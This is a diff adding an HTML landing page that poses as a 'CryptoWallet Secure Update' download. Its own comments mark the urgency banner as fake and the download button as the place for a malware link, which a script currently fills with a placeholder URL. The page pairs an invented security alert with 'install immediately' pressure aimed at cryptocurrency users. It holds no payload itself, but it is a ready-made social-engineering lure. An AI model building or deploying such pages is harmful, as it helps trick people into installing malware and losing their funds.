@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+      <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CryptoWallet Secure Update</title>
+    <style>
+        :root {
+            --primary-color: #007bff;
+            --secondary-color: #0056b3;
+            --bg-color: #f4f6f9;
+            --text-color: #333;
+            --card-bg: #ffffff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            background-color: var(--card-bg);
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.15);
+            width: 90%;
+            max-width: 600px;
+            padding: 40px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .badge {
+            background-color: #28a745;
+            color: white;
+            padding: 5px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        p.description {
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 30px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 6px rgba(0, 123, 255, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        .download-btn:hover {
+            background-color: var(--secondary-color);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 123, 255, 0.4);
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+            100% { transform: scale(1); }
+        }
+
+        .features {
+            display: flex;
+            justify-content: space-around;
+            margin-top: 30px;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        .feature-item {
+            flex: 1;
+            padding: 0 10px;
+        }
+
+        .feature-icon {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: var(--primary-color);
+        }
+
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #999;
+        }
+
+        /* Fake Security Alert Bar */
+        .alert-bar {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 10px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            border: 1px solid #ffeeba;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- Fake Urgency Alert -->
+        <div class="alert-bar">
+            ⚠️ Critical security vulnerability detected in older wallet versions.
+        </div>
+
+        <span class="badge">Version 2.4.1 - Stable Release</span>
+        <h1>CryptoWallet Secure Update</h1>
+        
+        <p class="description">
+            We've optimized transaction speeds and patched a critical bug affecting USDT transfers. 
+            This update ensures maximum security for your assets. Please install immediately to avoid sync errors.
+        </p>
+
+        <!-- LINK TO YOUR MALWARE GOES HERE -->
+        <a href="#" id="downloadLink" class="download-btn">
+            ⬇ Download Update (v2.4.1)
+        </a>
+
+        <div class="features">
+            <div class="feature-item">
+                <div class="feature-icon">🔒</div>
+                <strong>Encrypted</strong>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">⚡</div>
+                <strong>Fast Sync</strong>
+            </div>
+            <div class="feature-item">
+                <div class="feature-icon">✅</div>
+                <strong>Verified</strong>
+            </div>
+        </div>
+
+        <div class="footer">
+            &copy; 2026 CryptoWallet Inc. All rights reserved.<br>
+            File Size: 4.2 MB | OS: Windows 10/11
+        </div>
+    </div>
+
+    <script>
+        
+        const downloadUrl = 'https://microsoft.com'; 
+        
+        document.getElementById('downloadLink').href = downloadUrl;
+    </script>
+</body>
+</html>
